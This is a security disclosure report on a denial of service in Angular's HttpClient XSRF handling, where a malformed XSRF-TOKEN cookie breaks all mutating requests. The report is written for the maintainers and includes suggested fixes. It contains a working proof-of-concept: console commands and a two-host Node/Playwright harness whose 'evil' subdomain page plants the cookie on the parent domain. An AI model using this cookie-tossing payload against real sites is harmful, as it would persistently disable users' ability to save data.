# Security report — Malformed XSRF-TOKEN cookie causes a persistent, cross-origin denial of service on all mutating HTTP requests

**Component:** `@angular/common` (HttpClient XSRF protection) + `@angular/common` cookie parsing
**Affected versions:** confirmed on `@angular/common@22.1.0` (npm); source present on `main` (`22.2.0-next.0`)
**Class:** availability (denial of service). Not code execution, not information disclosure, not an XSRF bypass.
**Reporter route:** intended for security@angular.io (do not file as a public issue — this is remotely triggerable without XSS).

---

## Summary

`HttpClient`'s built-in XSRF interceptor reads the XSRF cookie on every mutating,
same-origin request. The cookie value is passed to `decodeURIComponent` with no
error handling, and the interceptor calls the token extractor **outside** its only
`try/catch`. A cookie value containing a malformed percent-escape (a single `%` is
enough) makes `decodeURIComponent` throw `URIError: URI malformed`, and that error
escapes the interceptor and fails the request.

Because a **related-domain attacker** (someone controlling any sibling subdomain)
can set a `Domain`-scoped cookie on the parent domain, this is exploitable
**cross-origin and without XSS** on the victim origin. The effect is a
**persistent** denial of service over every POST/PUT/DELETE/PATCH the app makes,
until the cookie is cleared by hand.

---

## Affected code

**1. Unguarded decode — `packages/common/src/cookie.ts:16`**

```ts
export function parseCookieValue(cookieStr: string, name: string): string | null {
  name = encodeURIComponent(name);
  for (const cookie of cookieStr.split(';')) {
    const eqIndex = cookie.indexOf('=');
    const [cookieName, cookieValue]: string[] =
      eqIndex == -1 ? [cookie, ''] : [cookie.slice(0, eqIndex), cookie.slice(eqIndex + 1)];
    if (cookieName.trim() === name) {
      return decodeURIComponent(cookieValue);   // <-- throws on malformed input, no guard
    }
  }
  return null;
}
```

**2. Token read outside the try — `packages/common/http/src/xsrf.ts:104-125`**

```ts
try {
  const locationHref = inject(PlatformLocation).href;
  const {origin: locationOrigin} = new URL(locationHref);
  const {origin: requestOrigin} = new URL(req.url, locationOrigin);
  if (locationOrigin !== requestOrigin) {
    return next(req);
  }
} catch {
  return next(req);                              // the try only wraps URL parsing
}

const token = inject(HttpXsrfTokenExtractor).getToken();   // <-- OUTSIDE the try; can throw
const headerName = inject(XSRF_HEADER_NAME);
if (token != null && !req.headers.has(headerName)) {
  req = req.clone({headers: req.headers.set(headerName, token)});
}
return next(req);
```

`getToken()` → `HttpXsrfCookieExtractor.getToken()` → `parseCookieValue(document.cookie, ...)` →
`decodeURIComponent(cookieValue)`. `decodeURIComponent('%')` throws `URIError`, which
propagates out of `xsrfInterceptorFn` and rejects the request.

Both shapes ship in the published npm bundles:
- `@angular/common/fesm2022/_xhr-chunk.mjs` — `parseCookieValue` without a guard
- `@angular/common/fesm2022/_module-chunk.mjs` — `getToken()` after the `catch`

---

## Impact

- Every **same-origin mutating** request (POST/PUT/DELETE/PATCH) fails while the
  cookie is present. GET/HEAD are unaffected (the interceptor returns early), so
  the app often still *looks* loaded — reads work, writes are dead.
- **Persistent:** the cookie survives until deleted. A non-technical victim has no
  obvious way to recover.
- **No XSS required.** Delivered by a related-domain attacker via a `Domain` cookie.
- The trigger value (`%`) is a syntactically valid cookie value.

This is availability only. There is no token leak and no XSRF bypass — the request
never leaves the client.

---

## Reproduction A — minimal, single origin (proves the defect)

Shows that a malformed cookie breaks HttpClient, with a control that proves the
cookie is the cause.

1. In any Angular app that uses `provideHttpClient(withXsrfConfiguration(...))` or
   the default XSRF setup, open the browser console on the app's origin.
2. Baseline (control):
   ```js
   document.cookie = 'XSRF-TOKEN=abc123; path=/';
   // trigger any POST in the app  -> succeeds
   ```
3. Malformed cookie:
   ```js
   document.cookie = 'XSRF-TOKEN=%; path=/';
   // trigger any POST in the app  -> fails with "URIError: URI malformed"
   ```
4. Recover (control):
   ```js
   document.cookie = 'XSRF-TOKEN=abc123; path=/';
   // trigger the POST again  -> succeeds
   ```

Steps 2 and 4 are controls: the request works with a valid cookie and again after
restoring one, so the failure at step 3 is caused by the cookie, not by app state.

---

## Reproduction B — cross-origin, two hosts (proves exploitability without XSS)

This demonstrates the **related-domain attacker**: the attacker runs only on
`evil.contoh.test`, never on the victim origin, and still disables writes on
`app.contoh.test`.

### B.1 Prerequisites

- Node 18+ and a Chromium (the steps below use Playwright's, but any Chromium works).
- Two hostnames resolving to localhost. The driver in B.4 does this **without root**
  via Chromium's `--host-resolver-rules=MAP *.contoh.test 127.0.0.1`, so no
  `/etc/hosts` edit is needed. (If you drive a different browser, add
  `127.0.0.1 app.contoh.test evil.contoh.test` to `/etc/hosts` instead.)

### B.2 Install the real Angular packages

```bash
mkdir xsrf-poc && cd xsrf-poc
npm init -y
npm i @angular/core@22 @angular/common@22 @angular/compiler@22 \
      @angular/platform-browser@22 rxjs tslib
```

### B.3 The victim app — `app.html`

A real Angular app with the default `HttpClient`. (Import map points at the
installed FESM bundles; `@angular/compiler` is imported so the JIT can compile the
inline component.)

```html
<!doctype html><meta charset="utf-8"><title>victim app</title>
<script type="importmap">
{"imports":{
 "@angular/compiler":"/node_modules/@angular/compiler/fesm2022/compiler.mjs",
 "@angular/common/http":"/node_modules/@angular/common/fesm2022/http.mjs",
 "@angular/common":"/node_modules/@angular/common/fesm2022/common.mjs",
 "@angular/core":"/node_modules/@angular/core/fesm2022/core.mjs",
 "@angular/core/primitives/signals":"/node_modules/@angular/core/fesm2022/primitives-signals.mjs",
 "@angular/core/primitives/di":"/node_modules/@angular/core/fesm2022/primitives-di.mjs",
 "@angular/core/primitives/event-dispatch":"/node_modules/@angular/core/fesm2022/primitives-event-dispatch.mjs",
 "@angular/platform-browser":"/node_modules/@angular/platform-browser/fesm2022/platform-browser.mjs",
 "tslib":"/node_modules/tslib/tslib.es6.mjs",
 "rxjs":"/node_modules/rxjs/dist/esm/index.js",
 "rxjs/operators":"/node_modules/rxjs/dist/esm/operators/index.js"}}
</script>
<pre id="o">booting…</pre>
<script type="module">
import '@angular/compiler';
import {Component} from '@angular/core';
import {bootstrapApplication} from '@angular/platform-browser';
import {provideHttpClient, HttpClient} from '@angular/common/http';
const App = Component({selector:'app-root', template:'x', standalone:true})(class{});
document.body.appendChild(document.createElement('app-root'));
const app = await bootstrapApplication(App, {providers:[provideHttpClient()]});
const http = app.injector.get(HttpClient);
let result;
try {
  await new Promise((res,rej)=>http.post('/echo',{a:1}).subscribe({next:res,error:rej}));
  result = {post:'SUCCESS'};
} catch (e) {
  result = {post:'FAILED', error:String((e&&e.message)||e)};
}
result.cookie = document.cookie;
document.getElementById('o').textContent = JSON.stringify(result, null, 2);
window.__R__ = result;
</script>
```

Note: rxjs ships ESM with extensionless imports, so the static server in B.4
resolves `./x` → `./x.js` → `./x/index.js` the way Node does.

### B.4 Server for both hosts + driver — `poc.mjs`

One server answers for both hostnames (distinguished by the `Host` header). The
`evil.contoh.test` page does nothing but set a `Domain`-scoped cookie on the parent.

```js
import http from 'http'; import fs from 'fs'; import path from 'path';
import {chromium} from 'playwright';
const ROOT = process.cwd();
const MIME = {'.html':'text/html','.mjs':'text/javascript','.js':'text/javascript'};
const resolve = p => { for (const c of [p, p+'.js', path.join(p,'index.js')])
  { try { if (fs.statSync(c).isFile()) return c; } catch {} } return null; };

const srv = http.createServer((req,res) => {
  const host = (req.headers.host||'').split(':')[0];
  if (req.url.startsWith('/echo')) { res.writeHead(200,{'Content-Type':'application/json'}); res.end('{"ok":true}'); return; }
  if (host === 'evil.contoh.test') {
    res.writeHead(200,{'Content-Type':'text/html'});
    res.end(`<!doctype html><title>evil</title><script>
      document.cookie = 'XSRF-TOKEN=%; Domain=contoh.test; path=/';
    </script>`);
    return;
  }
  if (req.url === '/' || req.url === '/app.html') {
    res.writeHead(200,{'Content-Type':'text/html'}); res.end(fs.readFileSync(path.join(ROOT,'app.html'))); return;
  }
  const f = resolve(path.join(ROOT, decodeURIComponent(req.url.split('?')[0])));
  if (!f) { res.writeHead(404); res.end('nf'); return; }
  res.writeHead(200,{'Content-Type':MIME[path.extname(f)]||'text/javascript'}); res.end(fs.readFileSync(f));
});
await new Promise(r => srv.listen(8099, r));
const B = 'http://app.contoh.test:8099', E = 'http://evil.contoh.test:8099';

const browser = await chromium.launch({args:[
  '--no-sandbox',
  '--host-resolver-rules=MAP *.contoh.test 127.0.0.1',  // no /etc/hosts needed
]});
const ctx = await browser.newContext();  // one shared cookie jar, like a real browser

async function runApp() {
  const p = await ctx.newPage();
  await p.goto(B + '/app.html', {waitUntil:'load'});
  await p.waitForFunction('window.__R__ !== undefined', {timeout:20000});
  const r = await p.evaluate(() => window.__R__); await p.close(); return r;
}

console.log('1. before attack        :', JSON.stringify(await runApp()));
const e = await ctx.newPage(); await e.goto(E + '/', {waitUntil:'load'}); await e.close();  // plant cookie
console.log('2. after cookie planted :', JSON.stringify(await runApp()));

await browser.close(); srv.close();
```

### B.5 Run

```bash
npm i -D playwright        # or point executablePath at any Chromium
node poc.mjs
```

### B.6 Expected output

```
1. before attack        : {"post":"SUCCESS","cookie":""}
2. after cookie planted : {"post":"FAILED","error":"URI malformed","cookie":"XSRF-TOKEN=%"}
```

Step 1 is the control: with no cookie, the POST succeeds. After
`evil.contoh.test` sets `XSRF-TOKEN=%; Domain=contoh.test`, the victim app on the
**different origin** `app.contoh.test` sees the cookie and every POST fails.

---

## Why the attacker's step is realistic

Setting a `Domain=contoh.test` cookie from `evil.contoh.test` is normal cookie
behavior — browsers allow a host to set cookies for its parent domain. Only the
`__Host-` cookie name prefix prevents `Domain` scoping, and Angular's default
cookie name is `XSRF-TOKEN`, which is not `__Host-` prefixed. The related-domain
attacker model is realistic wherever an origin shares a parent domain with
user-content subdomains, shared hosting, third-party-managed marketing subdomains,
or forgotten legacy subdomains.

---

## Suggested fix

Either or both — both are small and low-risk:

1. Guard the decode in `parseCookieValue` (`cookie.ts:16`):
   ```ts
   if (cookieName.trim() === name) {
     try { return decodeURIComponent(cookieValue); }
     catch { return cookieValue; }   // or null — but do not throw
   }
   ```
2. Move the token read inside the existing `try` in `xsrfInterceptorFn`
   (`xsrf.ts`), so a failure extracting the token can never fail the request:
   ```ts
   let token: string | null = null;
   try {
     ...origin check...
     token = inject(HttpXsrfTokenExtractor).getToken();
   } catch {
     return next(req);
   }
   ```

Fix (1) is the more general one: `parseCookieValue` is also used by
`@angular/common`'s cookie-based locale/other lookups, and none of them should
throw on an attacker-influenced cookie.

---

## Evidence artifacts (in this repo, for the maintainers' convenience)

- `analysis/evidence/f09-xsrf-cookie-dos.txt` — single-origin runtime proof
- `analysis/evidence/f09-cookie-tossing-demo.txt` — two-host cross-origin proof
- `analysis/tools/xsrf/` — the harnesses that produced them
